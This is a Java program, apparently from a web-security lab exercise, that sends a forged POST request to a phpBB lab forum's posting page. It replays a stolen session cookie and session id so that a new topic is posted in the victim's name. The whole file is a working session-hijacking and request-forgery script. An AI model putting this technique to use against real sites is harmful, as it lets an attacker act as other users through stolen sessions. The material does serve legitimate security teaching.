import java.io.*;
import java.net.*;

public class HTTPSimpleForge {
	public static void main(String[] args) throws IOException {
	try {
		int responseCode;
		InputStream responseIn=null;

		// URL to be forged.
		URL url = new URL ("http://www.xsslabphpbb.com/posting.php");
		
		URLConnection urlConn = url.openConnection();
		if (urlConn instanceof HttpURLConnection) {
			urlConn.setConnectTimeout(60000);
			urlConn.setReadTimeout(90000);
		}
		urlConn.addRequestProperty("User-agent", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/2009033100 Ubuntu/9.04 (jaunty) Firefox/3.0.8");
		//urlConn.addRequestProperty("Host", "www.xsslabphpbb.com");
		urlConn.addRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		//urlConn.addRequestProperty("Accept-Language", "en-us,en;q=0.5");
		//urlConn.addRequestProperty("Accept-Encoding", "gzip,deflate");
		urlConn.addRequestProperty("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
		urlConn.addRequestProperty("Keep-Alive", "300");
		urlConn.addRequestProperty("Connection", "keep-alive");
		urlConn.addRequestProperty("Referer", "http://www.xsslabphpbb.com/posting.php?mode=newtopic&f=1");
		urlConn.addRequestProperty("Cookie", "phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%223%22%3B%7D; phpbb2mysql_sid=f0997a933809ac32a5e1a7673ea803a9; phpbb2mysql_t=a%3A2%3A%7Bi%3A5%3Bi%3A1580847545%3Bi%3A6%3Bi%3A1580848407%3B%7D");
		urlConn.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		
		String data="subject=333&addbbcode18=%23444444&addbbcode20=0&helpbox=Tip%3A+Styles+can+be+applied+quickly+to+selected+text.&message=333&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=f0997a933809ac32a5e1a7673ea803a9&f=1&post=Submit";
		
		urlConn.addRequestProperty("Content-Length", "" + data.length());
		//urlConn.addRequestProperty("subject", data);
		urlConn.setDoOutput(true);

		OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
		wr.write(data);
		wr.flush();

		if (urlConn instanceof HttpURLConnection) {
			HttpURLConnection httpConn = (HttpURLConnection) urlConn;
			responseCode = httpConn.getResponseCode();
			System.out.println("Response Code = " + responseCode);

			if (responseCode == HttpURLConnection.HTTP_OK) {
				responseIn = urlConn.getInputStream();
				BufferedReader buf_inp = new BufferedReader(new InputStreamReader(responseIn));
				String inputLine;
				while ((inputLine = buf_inp.readLine()) != null) {
					System.out.println(inputLine);
				}
			}
		}
	} catch (MalformedURLException e) {
		e.printStackTrace();
	}
	}
}
